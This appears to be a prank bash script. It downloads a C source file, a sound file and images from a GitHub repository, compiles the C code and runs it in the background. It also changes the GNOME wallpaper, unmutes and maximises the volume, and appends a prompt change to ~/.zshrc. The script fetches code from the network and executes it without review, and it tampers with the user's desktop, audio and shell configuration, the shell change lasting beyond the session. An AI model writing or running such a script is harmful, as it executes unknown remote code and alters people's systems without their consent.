#!/bin/bash


wget https://github.com/Redalamtaoui/Maroc_telecom_pack/raw/main/aa.wav
wget https://github.com/Redalamtaoui/Maroc_telecom_pack/raw/main/aaaaaa.c

image_url="https://github.com/Redalamtaoui/Maroc_telecom_pack/blob/main/imm.jpg?raw=true"

wget -O image.jpg "$image_url"

img="https://github.com/Redalamtaoui/Maroc_telecom_pack/blob/main/mm.png?raw=true"


wget -O image1.png "$img"

#gsettings set org.gnome.desktop.background picture-uri ./image1.jpg
gsettings set org.gnome.desktop.background picture-uri "file://$(pwd)/image1.png"


cc aaaaaa.c -lSDL2
pactl set-sink-mute @DEFAULT_SINK@ false
pactl set-sink-volume @DEFAULT_SINK@ 100%

echo 'PS1="Maroc_telecom=>"' >> ~/.zshrc
./a.out &





